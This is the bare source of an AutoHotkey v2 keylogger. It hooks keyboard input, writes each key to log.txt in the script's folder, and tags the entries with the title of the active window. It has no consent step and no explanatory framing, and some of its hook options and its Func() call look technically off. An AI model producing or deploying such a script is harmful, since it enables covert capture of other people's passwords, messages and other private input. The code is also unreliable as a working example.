#Requires AutoHotkey v2.0
#SingleInstance Force

LogFile := A_ScriptDir "\log.txt"
LastWin := ""

; Create log file if it doesn't exist
if !FileExist(LogFile)
    FileAppend("", LogFile)

; Set up input hook
ih := InputHook("V")
ih.KeyOpt("{All}", "E") ; capture every key
ih.OnKeyDown := Func("LogKey")
ih.Start()

LogKey(ih, vk, sc) {
    global LogFile, LastWin
    try
        CurrentWin := WinGetTitle("A")
    catch
        CurrentWin := "N/A"

    ; Only log if window changed
    if (CurrentWin != LastWin) {
        FileAppend("`n[" CurrentWin "]`n", LogFile)
        LastWin := CurrentWin
    }

    ; Append key
    Key := GetKeyName(vk)
    if (Key != "")
        FileAppend(Key, LogFile)
}